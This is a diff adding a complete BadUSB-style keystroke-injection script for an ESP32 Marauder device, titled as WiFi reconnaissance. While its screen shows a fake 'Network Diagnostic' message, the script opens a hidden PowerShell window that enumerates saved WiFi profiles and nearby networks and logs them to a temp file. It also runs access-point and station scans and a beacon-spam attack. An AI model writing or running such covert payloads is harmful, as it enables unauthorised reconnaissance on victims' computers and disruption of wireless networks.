@@ -1,0 +1,77 @@
+REM ===============================================
+REM 📡 PP_Tech WiFi Reconnaissance - US 🇺🇸
+REM Layout: US QWERTY (English)
+REM WiFi reconnaissance with ESP32 Marauder
+REM ===============================================
+
+DELAY 2000
+LED_OFF
+DISPLAY_CLEAR
+WIFI_ON
+
+REM Network diagnostic interface
+DISPLAY_TEXT 10 5 Network Diagnostic
+DISPLAY_TEXT 5 20 Incoflandres Corp.
+DISPLAY_TEXT 20 35 Scanning...
+
+LED 0 0 255 150
+DELAY 2000
+
+REM Phase 1: Discrete WiFi scan
+DISPLAY_TEXT 0 50 WiFi Scan: Active
+ESP32M scan -t ap -s
+DELAY 5000
+
+REM Phase 2: Nearby networks analysis
+DISPLAY_TEXT 0 60 Cataloging APs...
+LED 255 255 0 200
+
+REM PowerShell script for WiFi analysis (US)
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Command "
+DELAY 300
+STRING $wifi=netsh wlan show profile|Select-String 'All User';
+DELAY 300
+STRING $nets=netsh wlan show available|Select-String 'SSID';
+DELAY 300
+STRING $adapters=Get-NetAdapter|?{$_.Name -like '*Wi-Fi*' -or $_.Name -like '*Wireless*'};
+DELAY 300
+
+REM Log found networks
+STRING echo 'PP_Tech WiFi Recon - '(Get-Date)|Out-File $env:TEMP\wifi_scan.log;
+DELAY 200
+STRING $nets|Out-File $env:TEMP\wifi_scan.log -Append;
+DELAY 200
+STRING exit"
+ENTER
+
+DELAY 3000
+
+REM Phase 3: ESP32 Marauder advanced scan
+DISPLAY_CLEAR
+DISPLAY_TEXT 15 15 Advanced Scan
+DISPLAY_TEXT 10 30 Collecting data...
+LED 255 0 255 255
+
+REM Marauder WiFi reconnaissance
+ESP32M scan -t sta -s
+DELAY 5000
+
+REM Security analysis
+DISPLAY_TEXT 0 45 Security analysis
+ESP32M attack -t beacon -l incoflandres_test
+DELAY 3000
+ESP32M stop
+
+REM Discrete completion
+DISPLAY_CLEAR
+DISPLAY_TEXT 20 25 Diagnostic
+DISPLAY_TEXT 20 40 Complete!
+LED 0 255 0 255
+
+DELAY 3000
+DISPLAY_CLEAR
+LED_OFF
+WIFI_OFF
+RESET
